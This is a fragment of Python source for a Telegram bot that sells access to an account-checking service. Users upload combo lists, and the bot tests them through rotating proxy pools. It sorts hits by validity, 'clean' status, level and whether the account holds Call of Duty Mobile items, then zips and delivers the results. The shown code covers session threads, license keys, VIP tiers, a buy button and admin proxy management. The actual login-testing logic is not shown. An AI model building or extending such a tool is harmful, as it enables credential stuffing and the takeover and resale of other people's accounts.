                                u3[uid]["total_checked"]+=st2.get("total",0)
                                save_users(u3)
                            zo2=new_rf/f"results_{uid}_{new_ts}.zip"; zp2=zip_results(new_rf,zo2)
                            note2=" (Stopped)" if new_stop.is_set() else ""
                            asyncio.run_coroutine_threadsafe(
                                deliver_results(context.bot,cid,uid,zp2,st2,combo_file=combo,note=note2),loop)
                        except Exception as ex2:
                            asyncio.run_coroutine_threadsafe(context.bot.send_message(
                                chat_id=cid,text=f" <b>Error:</b> <code>{str(ex2)[:300]}</code>",
                                parse_mode=ParseMode.HTML),loop)
                        finally:
                            _checker_semaphore.release(); inc_session(uid); del_combo(combo)
                            clear_persisted_session(uid)
                            with sessions_lock:
                                if uid in active_sessions:
                                    active_sessions[uid]["status"]="done"
                                    try:
                                        _ls=active_sessions[uid].get("live_stats")
                                        _ps=active_sessions[uid].get("prev_stats",{})
                                        _pp=active_sessions[uid].get("prev_processed",0)
                                        _cs=_ls.get_stats() if _ls else {}
                                        _fs=dict(_cs)
                                        if _ps:
                                            for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
                                                _fs[_k]=_cs.get(_k,0)+_ps.get(_k,0)
                                        _fs["total"]=_pp+_cs.get("total",0)
                                        active_sessions[uid]["final_stats"]=_fs
                                    except: pass
                    threading.Thread(target=_continue_bg,daemon=True,name=f"checker-cont-{uid}").start()
                    return  # exit current bg, _continue_bg takes over
                else:
                    note=" (Stopped)" if stop_ev.is_set() else ""
                    asyncio.run_coroutine_threadsafe(
                        deliver_results(context.bot,cid,uid,zp,st,combo_file=combo,note=note),loop)
            except Exception as ex:
                asyncio.run_coroutine_threadsafe(context.bot.send_message(chat_id=cid,
                    text=f" <b>Error:</b> <code>{str(ex)[:300]}</code>",parse_mode=ParseMode.HTML),loop)
            finally:
                _status_stop.set()
                _checker_semaphore.release(); inc_session(uid); del_combo(combo)
                clear_persisted_session(uid)
                with sessions_lock:
                    if uid in active_sessions:
                        active_sessions[uid]["status"]="done"
                        try:
                            _ls=active_sessions[uid].get("live_stats")
                            _ps=active_sessions[uid].get("prev_stats",{})
                            _pp=active_sessions[uid].get("prev_processed",0)
                            _cs=_ls.get_stats() if _ls else {}
                            _fs=dict(_cs)
                            if _ps:
                                for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
                                    _fs[_k]=_cs.get(_k,0)+_ps.get(_k,0)
                            _fs["total"]=_pp+_cs.get("total",0)
                            active_sessions[uid]["final_stats"]=_fs
                        except: pass

        t=threading.Thread(target=bg,daemon=True,name=f"checker-{uid}"); t.start()
        with sessions_lock: active_sessions[uid]["thread"]=t

# ════════════════════════════════════════════
#  DOCUMENT HANDLER
# ════════════════════════════════════════════
async def on_text(update,context):
    """Route ReplyKeyboard button presses and handle proxy paste / awaited inputs."""
    tg=update.effective_user; uid=str(tg.id); cfg=load_config()
    text=(update.message.text or "").strip()
    if not text: return

    # ── Admin proxy-line number input ────────────────────────────────────
    with sessions_lock:
        pf_await=active_sessions.get(uid,{}).get("awaiting_proxy_line",None)
        pp_await=active_sessions.get(uid,{}).get("awaiting_proxy_paste",False)
        adm_await=active_sessions.get(uid,{}).get("awaiting_admin_input",None)

    # ── Admin awaited inputs (text prompts for settings) ─────────────────
    if adm_await:
        await _handle_admin_text_input(update, context, uid, tg, cfg, adm_await, text)
        return

    # ── Proxy line number awaited ─────────────────────────────────────────
    if pf_await and text.isdigit():
        await _handle_proxy_line_check(update, context, uid, pf_await, int(text))
        return

    # ── Proxy paste awaited ───────────────────────────────────────────────
    if pp_await and is_admin(tg.id,cfg):
        valid=[]; invalid=0
        for ln in text.splitlines():
            ln=ln.strip()
            if not ln or ln.startswith("#"): continue
            if ":" in ln or "://" in ln: valid.append(ln)
            else: invalid+=1
        if not valid:
            await update.message.reply_text(
                f"{pe(2)} <b>No Valid Proxies Found</b>\n"
                f"{pe_sep()}\n"
                f"Each line must be <code>host:port</code> or <code>scheme://host:port</code>.",
                parse_mode=ParseMode.HTML); return
        fname=f"pasted_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        dest=PROXY_DIR/fname
        with open(dest,"w",encoding="utf-8") as f:
            for ln in valid: f.write(ln+"\n")
        with sessions_lock:
            if uid in active_sessions: active_sessions[uid]["awaiting_proxy_paste"]=False
        try:
            import dec_tyrantv12 as _dty2; _dty2.geo_rotator.__init__()
            reload_str=f"Proxy rotator reloaded"
        except Exception as e: reload_str=f"Reload failed: {e}"
        all_pf=sorted(PROXY_DIR.glob("*.txt"))
        fl="\n".join(f"   <code>{p.name}</code>" for p in all_pf) or "  (none)"
        await update.message.reply_text(
            f"{pe(3)} <b>Proxies Saved!</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} File    : <code>{fname}</code>\n"
            f"{pe(1)} Saved   : <code>{len(valid):,}</code> proxies\n"
            f"{pe(1)} Skipped : <code>{invalid}</code> invalid\n"
            f"{pe_sep()}\n{reload_str}\n{pe_sep()}\n"
            f"<b>All proxy files:</b>\n{fl}",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_admin_main(cfg))
        return

    # ── ReplyKeyboard button routing ─────────────────────────────────────
    ud,_ = get_or_create_user(uid, tg.username or "", tg.first_name or "")

    # ── USER buttons ──────────────────────────────────────────────────────
    if text == BTN_CHECK:
        # Simulate /start → start_check flow
        await _handle_start_check(update, context, uid, tg, cfg, ud)
        return

    if text == BTN_ADMIN:
        if not is_admin(tg.id,cfg):
            await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
        await _show_admin_panel(update.message, cfg)
        return

    if text == BTN_STATUS:
        await cmd_status(update, context); return

    if text == BTN_STOP:
        await _do_stop(update, context); return

    if text == BTN_RESULTS:
        await cmd_myresultsfile(update, context); return

    if text == BTN_DELETE:
        await cmd_delete_file(update, context); return

    if text == BTN_HITS_ON:
        await cmd_hits_on(update, context); return

    if text == BTN_HITS_OFF:
        await cmd_hits_off(update, context); return

    if text == BTN_BUY:
        await cmd_buy(update, context); return

    if text == BTN_DEMO:
        await cmd_demo(update, context); return

    # ── SETTINGS buttons (while in setup state) ───────────────────────────
    if text == BTN_START_NOW:
        # Delegate to callback handler logic
        class _FakeQuery:
            data = "do_start_check"
            from_user = tg
            message = update.message
            async def answer(self, *a, **kw): pass
            async def edit_message_text(self, *a, **kw):
                await update.message.reply_text(*a, **kw)
        await _do_start_check_logic(update, context, uid, cfg, ud)
        return

    if text == BTN_LVL_MENU:
        with sessions_lock: s=active_sessions.get(uid,{})
        lk=s.get("lvl_key","lvl_all"); ck=s.get("cf_key","cf_both")
        await update.message.reply_text(
            f"{pe(2)} <b>Choose Level Filter</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Current : {LEVEL_OPTIONS[lk]['label']}\n"
            f"{pe_sep()}",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_level()); return

    if text == BTN_CF_MENU:
        with sessions_lock: s=active_sessions.get(uid,{})
        lk=s.get("lvl_key","lvl_all"); ck=s.get("cf_key","cf_both")
        await update.message.reply_text(
            f"{pe(2)} <b>Choose Clean Filter</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Current : {CLEAN_OPTIONS[ck]['label']}\n"
            f"{pe_sep()}",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_filter()); return

    if text in LEVEL_BTN_MAP:
        key = LEVEL_BTN_MAP[text]
        with sessions_lock:
            active_sessions.setdefault(uid,{})["lvl_key"] = key
        lk=key; ck=active_sessions.get(uid,{}).get("cf_key","cf_both")
        await update.message.reply_text(
            f"{pe(2)} <b>Level Filter Set</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Level  : {LEVEL_OPTIONS[key]['label']}\n"
            f"{pe(1)} Filter : {CLEAN_OPTIONS[ck]['label']}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Tap <b>{BTN_START_NOW}</b> to begin!",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_settings(uid)); return

    if text in CF_BTN_MAP:
        key = CF_BTN_MAP[text]
        with sessions_lock:
            active_sessions.setdefault(uid,{})["cf_key"] = key
        lk=active_sessions.get(uid,{}).get("lvl_key","lvl_all"); ck=key
        await update.message.reply_text(
            f"{pe(2)} <b>Clean Filter Set</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Level  : {LEVEL_OPTIONS[lk]['label']}\n"
            f"{pe(1)} Filter : {CLEAN_OPTIONS[key]['label']}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Tap <b>{BTN_START_NOW}</b> to begin!",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_settings(uid)); return

    if text == BTN_BACK:
        # Return to settings screen
        with sessions_lock: s=active_sessions.get(uid,{})
        st=s.get("status","")
        if st in ("waiting_file","file_received","settings"):
            await update.message.reply_text(
                f"{pe(2)} <b>Settings</b>\n{pe_sep()}\n{pe(1)} Choose level and filter, then start!",
                parse_mode=ParseMode.HTML, reply_markup=kb_settings(uid)); return
        # Otherwise go home
        await cmd_start(update, context); return

    if text == BTN_CANCEL:
        await _do_stop(update, context); return

    if text == BTN_CONTINUE:
        with sessions_lock: s2=active_sessions.get(uid,{})
        if s2 and s2.get("status")=="checking":
            with sessions_lock: active_sessions[uid]["stop_continue"]=True
            s2.get("stop_event",threading.Event()).set()
            await update.message.reply_text(
                f"{pe(5)} <b>Continuing!</b> {pe(5)}\n"
                f"{pe_sep()}\n"
                f"{pe(2)} Partial results sent now, checking continues! {pe(2)}\n"
                f"{pe_sep()}\n"
                f"{pe(2)} /check for live stats {pe(2)}",
                parse_mode=ParseMode.HTML, reply_markup=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user())
        else:
            await update.message.reply_text(f"{pe(1)} No active session.", parse_mode=ParseMode.HTML)
        return

    if text == BTN_STOP_GET:
        with sessions_lock: s2=active_sessions.get(uid,{})
        if s2 and s2.get("status")=="checking":
            with sessions_lock: active_sessions[uid]["stop_continue"]=False
            s2.get("stop_event",threading.Event()).set()
            clear_persisted_session(uid)
            await update.message.reply_text(
                f"{pe(5)} <b>Stop Signal Sent!</b> {pe(5)}\n"
                f"{pe_sep()}\n"
                f"{pe(2)} Results will be zipped and sent shortly. {pe(2)}",
                parse_mode=ParseMode.HTML, reply_markup=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user())
        else:
            await update.message.reply_text(f"{pe(1)} No active session.", parse_mode=ParseMode.HTML)
        return

    # ── ADMIN buttons ─────────────────────────────────────────────────────
    if not is_admin(tg.id,cfg):
        return  # non-admin, non-routing text — ignore silently

    if text == BTN_ADM_BACK:
        await _show_admin_panel(update.message, cfg); return

    if text in (BTN_ADM_LOCK, BTN_ADM_UNLOCK):
        cfg2=load_config(); cfg2["locked"]=not cfg2.get("locked",False); save_config(cfg2)
        users2=load_users()
        if cfg2["locked"]:
            with sessions_lock:
                for uid2,s2 in active_sessions.items():
                    if s2.get("status")=="checking" and not users2.get(uid2,{}).get("vip"):
                        s2["stop_event"].set()
        status="LOCKED" if cfg2["locked"] else "UNLOCKED"
        await update.message.reply_text(
            f"{pe(2)} <b>Bot {status}</b>\n{pe_sep()}\nDone.",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_main(cfg2)); return

    if text == BTN_ADM_REFRESH:
        cfg2=load_config()
        saved_mc=cfg2.get("max_concurrent",5)
        if saved_mc!=MAX_CONCURRENT_CHECKERS: rebuild_semaphore(saved_mc)
        try:
            import dec_tyrantv12 as _dty2; _dty2.geo_rotator.__init__()
        except: pass
        await update.message.reply_text(
            f"{pe(3)} <b>Refreshed!</b>\n{pe_sep()}\nConfig and proxy rotator reloaded.",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_main(cfg2)); return

    if text == BTN_ADM_KEYS:
        cfg2=load_config(); keys2=load_keys()
        await update.message.reply_text(
            f"{pe(2)} <b>Keys Panel</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Total Keys : <code>{len(keys2)}</code>\n"
            f"{pe(1)} Used Keys  : <code>{sum(1 for k in keys2.values() if k.get('used_by'))}</code>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Choose action:",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_keys()); return

    if text in (BTN_ADM_GEN_HOURS, BTN_ADM_GEN_DAYS, BTN_ADM_GEN_MONTHS, BTN_ADM_GEN_LIFE):
        dtype_map={BTN_ADM_GEN_HOURS:"hours",BTN_ADM_GEN_DAYS:"days",BTN_ADM_GEN_MONTHS:"months",BTN_ADM_GEN_LIFE:"lifetime"}
        dtype=dtype_map[text]
        with sessions_lock:
            active_sessions.setdefault(uid,{})["awaiting_admin_input"]=f"genkey_{dtype}"
        hints={"hours":"e.g. 24  (for 24 hours)","days":"e.g. 7  (for 7 days)","months":"e.g. 1  (for 1 month)","lifetime":"Type max_users only  e.g. 1"}
        if dtype=="lifetime":
            await update.message.reply_text(
                f"{pe(2)} <b>Generate Lifetime Key</b>\n"
                f"{pe_sep()}\n"
                f"Send: <code>max_users</code>\n"
                f"Example: <code>1</code>",
                parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return
        await update.message.reply_text(
            f"{pe(2)} <b>Generate {dtype.title()} Key</b>\n"
            f"{pe_sep()}\n"
            f"Send: <code>value max_users</code>\n"
            f"Example: <code>{hints[dtype]}</code>  then max users, e.g. <code>24 1</code>",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text in (BTN_ADM_RM_ALL_K, BTN_ADM_RM_VIP_K, BTN_ADM_RM_NVIP_K):
        mode_map={BTN_ADM_RM_ALL_K:"all",BTN_ADM_RM_VIP_K:"vip",BTN_ADM_RM_NVIP_K:"nonvip"}
        mode=mode_map[text]
        users3=load_users(); cnt3=0
        for uid3 in list(users3.keys()):
            u3=users3[uid3]; iv3=u3.get("vip",False); ia3=u3.get("activated",False)
            match3=(mode=="all" and ia3) or (mode=="vip" and ia3 and iv3) or (mode=="nonvip" and ia3 and not iv3)
            if match3:
                users3[uid3].update({"activated":False,"key_used":None,"key_expires_at":None,"key_expired":False}); cnt3+=1
                with sessions_lock:
                    if uid3 in active_sessions: active_sessions[uid3].get("stop_event",threading.Event()).set()
                try: await context.bot.send_message(chat_id=int(uid3),text=f"{pe(2)} <b>Access Revoked</b>\n{pe_sep()}\nYour key was removed by admin.",parse_mode=ParseMode.HTML)
                except: pass
        save_users(users3)
        label3={"all":"All","vip":"VIP","nonvip":"Non-VIP"}[mode]
        await update.message.reply_text(
            f"{pe(3)} <b>Keys Removed ({label3})</b>\n"
            f"{pe_sep()}\n{pe(1)} Revoked: <code>{cnt3}</code> user(s)",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_keys()); return

    if text == BTN_ADM_USERS:
        users2=load_users()
        ac=sum(1 for u in users2.values() if u.get("activated"))
        bc=sum(1 for u in users2.values() if u.get("banned"))
        vc=sum(1 for u in users2.values() if u.get("vip"))
        await update.message.reply_text(
            f"{pe(2)} <b>Users Panel</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Total    : <code>{len(users2)}</code>\n"
            f"{pe(1)} Active   : <code>{ac}</code>\n"
            f"{pe(1)} Banned   : <code>{bc}</code>\n"
            f"{pe(1)} VIP      : <code>{vc}</code>\n"
            f"{pe_sep()}\n{pe(1)} Choose action:",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_users()); return

    if text in (BTN_ADM_ADDVIP, BTN_ADM_RMVIP, BTN_ADM_BAN, BTN_ADM_UNBAN, BTN_ADM_BROADCAST):
        action_map={BTN_ADM_ADDVIP:"addvip",BTN_ADM_RMVIP:"rmvip",BTN_ADM_BAN:"ban",BTN_ADM_UNBAN:"unban",BTN_ADM_BROADCAST:"broadcast"}
        action=action_map[text]
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]=action
        prompts={"addvip":"Send user ID to add VIP:","rmvip":"Send user ID to remove VIP:","ban":"Send user ID to ban:","unban":"Send user ID to unban:","broadcast":"Send broadcast message text:"}
        await update.message.reply_text(
            f"{pe(2)} <b>{text}</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} {prompts[action]}",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_ALLUSERS:
        users3=load_users()
        ac3=sum(1 for u in users3.values() if u.get("activated"))
        bc3=sum(1 for u in users3.values() if u.get("banned"))
        vc3=sum(1 for u in users3.values() if u.get("vip"))
        lines3=[f"{pe(2)} <b>Users ({len(users3)})</b>  Active:{ac3}  Banned:{bc3}  VIP:{vc3}\n{pe_sep()}"]
        for uid3,u3 in sorted(users3.items(),key=lambda x:x[1].get("joined",""),reverse=True):
            st3="BANNED" if u3.get("banned") else ("VIP" if u3.get("vip") else ("Active" if u3.get("activated") else "Pending"))
            lines3.append(f"[{st3}] <code>{uid3}</code> @{u3.get('username','?')}  {u3.get('total_checked',0):,} checked")
        msg3="\n".join(lines3)
        for chunk in [msg3[i:i+4000] for i in range(0,len(msg3),4000)]:
            await context.bot.send_message(chat_id=update.effective_chat.id,text=chunk,parse_mode=ParseMode.HTML)
        return

    if text == BTN_ADM_RUNNING:
        with sessions_lock:
            running=[(u2,dict(s)) for u2,s in active_sessions.items() if s.get("status")=="checking"]
        users2=load_users()
        if not running:
            await update.message.reply_text(f"{pe(2)} <b>No Active Sessions</b>\n{pe_sep()}\nNo one is checking right now.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_main(cfg)); return
        lines2=[f"{pe(3)} <b>Running ({len(running)})</b>\n{pe_sep()}"]
        for u2,s2 in running:
            ud2=users2.get(u2,{}); fn2=ud2.get("first_name","?"); un2=ud2.get("username","?")
            ls3=s2.get("live_stats"); st3=ls3.get_stats() if ls3 else {}
            orig2=s2.get("orig_total",0)
            done2=st3.get("total",0); pct2=int(done2/orig2*100) if orig2 else 0
            lines2.append(f"\n{pe(1)} <b>{fn2}</b> @{un2}\n{pe(1)} Progress: {done2}/{orig2} ({pct2}%)  CODM: {st3.get('has_codm',0)}")
        await update.message.reply_text("\n".join(lines2),parse_mode=ParseMode.HTML,reply_markup=kb_admin_main(cfg)); return

    if text == BTN_ADM_STATS:
        cfg2=load_config(); users2=load_users(); keys2=load_keys()
        tu=len(users2); au=sum(1 for u in users2.values() if u.get("activated"))
        bu=sum(1 for u in users2.values() if u.get("banned"))
        vu=sum(1 for u in users2.values() if u.get("vip"))
        tc=sum(u.get("total_checked",0) for u in users2.values())
        with sessions_lock: live2=sum(1 for s in active_sessions.values() if s.get("status")=="checking")
        pf2=list(PROXY_DIR.glob("*.txt")); tp2=0
        for pf3 in pf2:
            try:
                with open(pf3,"r",encoding="utf-8",errors="ignore") as fh:
                    tp2+=sum(1 for ln in fh if ln.strip() and not ln.strip().startswith("#"))
            except: pass
        await update.message.reply_text(
            f"{pe(3)} <b>Statistics</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Total Users   : <code>{tu}</code>\n"
            f"{pe(1)} Activated     : <code>{au}</code>\n"
            f"{pe(1)} Banned        : <code>{bu}</code>\n"
            f"{pe(1)} VIP           : <code>{vu}</code>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Running       : <code>{live2}/{MAX_CONCURRENT_CHECKERS}</code>\n"
            f"{pe(1)} Total Checked : <code>{tc:,}</code>\n"
            f"{pe(1)} Keys Total    : <code>{len(keys2)}</code>\n"
            f"{pe(1)} Keys Used     : <code>{sum(1 for k in keys2.values() if k.get('used_by'))}</code>\n"
            f"{pe(1)} Proxies       : <code>{tp2:,}</code> in <code>{len(pf2)}</code> file(s)\n"
            f"{pe(1)} Locked        : <code>{'YES' if cfg2.get('locked') else 'No'}</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_main(cfg2)); return

    if text == BTN_ADM_PROXY:
        pf4=sorted(PROXY_DIR.glob("*.txt")); tp4=0
        for pf5 in pf4:
            try:
                with open(pf5,"r",encoding="utf-8",errors="ignore") as fh:
                    tp4+=sum(1 for ln in fh if ln.strip() and not ln.strip().startswith("#"))
            except: pass
        await update.message.reply_text(
            f"{pe(2)} <b>Proxy Panel</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Files   : <code>{len(pf4)}</code>\n"
            f"{pe(1)} Proxies : <code>{tp4:,}</code>\n"
            f"{pe_sep()}\n{pe(1)} Choose action:",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_proxy()); return

    if text == BTN_ADM_UPL_PROXY:
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_proxy"]=True
        await update.message.reply_text(
            f"{pe(2)} <b>Upload Proxy File</b>\n"
            f"{pe_sep()}\n"
            f"Send your <code>.txt</code> proxy file now.",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_PASTE_PRX:
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_proxy_paste"]=True
        await update.message.reply_text(
            f"{pe(2)} <b>Paste Proxies</b>\n"
            f"{pe_sep()}\n"
            f"Paste proxy lines now (one per line).\n<code>host:port</code> or <code>host:port:user:pass</code>",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_PROXY_STAT:
        pf6=sorted(PROXY_DIR.glob("*.txt"))
        if not pf6:
            await update.message.reply_text(f"{pe(1)} No proxy files.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_proxy()); return
        lines6=[f"{pe(2)} <b>Proxy Files</b>\n{pe_sep()}"]
        tot6=0
        for p6 in pf6:
            try:
                with open(p6,"r",encoding="utf-8",errors="ignore") as f6:
                    cnt6=sum(1 for ln in f6 if ln.strip() and not ln.strip().startswith("#"))
                sz6=p6.stat().st_size; ss6=f"{sz6/1024:.1f}KB" if sz6<1024*1024 else f"{sz6/1024/1024:.1f}MB"
                tot6+=cnt6; lines6.append(f"{pe(1)} <code>{p6.name}</code>  {cnt6:,}  {ss6}")
            except: lines6.append(f"{pe(1)} <code>{p6.name}</code>  error")
        lines6.append(f"{pe_sep()}\nTotal: <code>{tot6:,}</code>")
        await update.message.reply_text("\n".join(lines6),parse_mode=ParseMode.HTML,reply_markup=kb_admin_proxy()); return

    if text == BTN_ADM_RM_PROXY:
        pf7=sorted(PROXY_DIR.glob("*.txt"))
        if not pf7:
            await update.message.reply_text(f"{pe(1)} No proxy files.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_proxy()); return
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]="del_proxy_select"
        fnames="\n".join(f"  <code>{p.name}</code>" for p in pf7)
        await update.message.reply_text(
            f"{pe(2)} <b>Remove Proxy File</b>\n{pe_sep()}\nSend the filename to delete (or <code>ALL</code>):\n{fnames}",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_RELOAD_PRX:
        try:
            import dec_tyrantv12 as _dty2; _dty2.geo_rotator.__init__()
            total_p=_dty2.geo_rotator.total if hasattr(_dty2.geo_rotator,"total") else "?"
            await update.message.reply_text(
                f"{pe(3)} <b>Proxy Reloaded!</b>\n{pe_sep()}\n{pe(1)} Total proxies: <code>{total_p}</code>",
                parse_mode=ParseMode.HTML, reply_markup=kb_admin_proxy())
        except Exception as e:
            await update.message.reply_text(f"{pe(1)} Reload failed: <code>{e}</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_proxy())
        return

    if text == BTN_ADM_SETTINGS:
        cfg5=load_config()
        ml5=cfg5.get('max_lines_per_check'); cd5=cfg5.get('cooldown_sessions')
        cd5_s=f"{cd5}sess→{cfg5.get('cooldown_minutes',30)}m" if cd5 else "Off"
        maint5="🔴 ON" if cfg5.get("maintenance_mode") else "🟢 Off"
        await update.message.reply_text(
            f"{pe(5)} <b>Settings Panel</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Threads       : <code>{cfg5.get('default_threads',5)}</code>\n"
            f"{pe(1)} Concurrent    : <code>{cfg5.get('max_concurrent',5)}</code>\n"
            f"{pe(1)} Limit         : <code>{cfg5.get('global_limit') or 'Unlimited'}</code>\n"
            f"{pe(1)} VIP Limit     : <code>{cfg5.get('vip_limit') or 'Unlimited'}</code>\n"
            f"{pe(2)} Max/Session   : <code>{ml5 or 'Unlimited'}</code> {pe(2)}\n"
            f"{pe(1)} Cooldown      : <code>{cd5_s}</code>\n"
            f"{pe(1)} Locked        : <code>{'YES 🔒' if cfg5.get('locked') else 'No 🔓'}</code>\n"
            f"{pe(1)} Maintenance   : <code>{maint5}</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_settings(cfg5)); return

    if text == BTN_ADM_MLIMIT:
        cfg5=load_config()
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]="setmlimit"
        await update.message.reply_text(
            f"{pe(2)} <b>Max Lines Per Check</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Current: <code>{cfg5.get('max_lines_per_check') or 'Unlimited'}</code>\n"
            f"{pe_sep()}\n"
            f"Send a number (e.g. <code>5000</code>) to set the max lines per session,\n"
            f"or <code>off</code> to remove the limit.\n\n"
            f"{pe(1)} This caps every user's session regardless of their personal limit.",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_DEN:
        cfg5=load_config()
        maint5="🔴 ACTIVE" if cfg5.get("maintenance_mode") else "🟢 Inactive"
        ann5=cfg5.get("announcement_text","").strip()
        ann5_s=f"Set ✅" if ann5 else "None"
        uptime_s5=int(time.time()-_railway_start); h5,m5=uptime_s5//3600,(uptime_s5%3600)//60
        await update.message.reply_text(
            f"{pe(5)} <b>⚡ Admin Den</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Maintenance  : <b>{maint5}</b> {pe(2)}\n"
            f"{pe(1)} Announcement : <code>{ann5_s}</code>\n"
            f"{pe(1)} Bot uptime   : <code>{h5}h {m5}m</code>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Advanced admin controls below:",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if text == BTN_ADM_ANNOUNCE:
        cfg5=load_config()
        ann5=cfg5.get("announcement_text","").strip()
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]="set_announcement"
        await update.message.reply_text(
            f"{pe(2)} <b>Announcement</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Current: <i>{ann5 or 'None'}</i>\n"
            f"{pe_sep()}\n"
            f"Send your announcement text (shown to users on /start).\n"
            f"Send <code>off</code> to clear.",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_MAINT:
        cfg5=load_config()
        cfg5["maintenance_mode"] = not cfg5.get("maintenance_mode", False)
        save_config(cfg5)
        status5="🔴 ENABLED" if cfg5["maintenance_mode"] else "🟢 DISABLED"
        await update.message.reply_text(
            f"{pe(5)} <b>Maintenance Mode {status5}</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Message: <i>{cfg5.get('maintenance_message','')}</i>\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Non-admin users {'blocked' if cfg5['maintenance_mode'] else 'can access normally'}. {pe(2)}",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if text == BTN_ADM_TOPUSERS:
        users5=load_users()
        sorted_u=sorted(users5.items(), key=lambda x: x[1].get("total_checked",0), reverse=True)[:10]
        lines5=[f"{pe(5)} <b>🏆 Top 10 Checkers</b> {pe(5)}\n{pe_sep()}"]
        medals=["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"]
        for i,(uid5,ud5) in enumerate(sorted_u):
            fn5=ud5.get("first_name","?"); un5=ud5.get("username","")
            tc5=ud5.get("total_checked",0); vt5=" VIP" if ud5.get("vip") else ""
            lines5.append(f"{medals[i]} <b>{fn5}</b>{' @'+un5 if un5 else ''}{vt5}\n    Checked: <code>{tc5:,}</code>  Sessions: <code>{ud5.get('sessions_count',0)}</code>")
        await update.message.reply_text("\n".join(lines5), parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if text == BTN_ADM_SYSINFO:
        import platform
        mb5=_get_rss_mb()
        uptime_s5=int(time.time()-_railway_start); h5,m5,s5=uptime_s5//3600,(uptime_s5%3600)//60,uptime_s5%60
        try:
            with open("/proc/loadavg","r") as f5: la5=f5.read().split()[:3]; load5=f"1m:{la5[0]} 5m:{la5[1]} 15m:{la5[2]}"
        except: load5="N/A"
        try:
            with open("/proc/meminfo","r") as f5:
                mi5={l.split(":")[0]:int(l.split()[1]) for l in f5 if ":" in l and l.split()[1].isdigit()}
            total_mb5=mi5.get("MemTotal",0)//1024; free_mb5=mi5.get("MemAvailable",0)//1024
            mem_str=f"{total_mb5-free_mb5}MB/{total_mb5}MB ({int((total_mb5-free_mb5)/total_mb5*100)}%)" if total_mb5 else "N/A"
        except: mem_str=f"RSS:{mb5:.0f}MB"
        with sessions_lock: live5=sum(1 for s in active_sessions.values() if s.get("status")=="checking")
        await update.message.reply_text(
            f"{pe(5)} <b>🖥 System Info</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Process RAM : <code>{mb5:.1f}MB</code> ({_MEM_LIMIT_MB}MB limit)\n"
            f"{pe(1)} System RAM  : <code>{mem_str}</code>\n"
            f"{pe(1)} CPU Load    : <code>{load5}</code>\n"
            f"{pe(1)} Uptime      : <code>{h5}h {m5}m {s5}s</code>\n"
            f"{pe(1)} Python      : <code>{platform.python_version()}</code>\n"
            f"{pe(1)} Active      : <code>{live5}</code> checkers\n"
            f"{pe(1)} Queue       : <code>{len(_checker_queue)}</code> waiting\n"
            f"{pe(1)} PID         : <code>{os.getpid()}</code>",
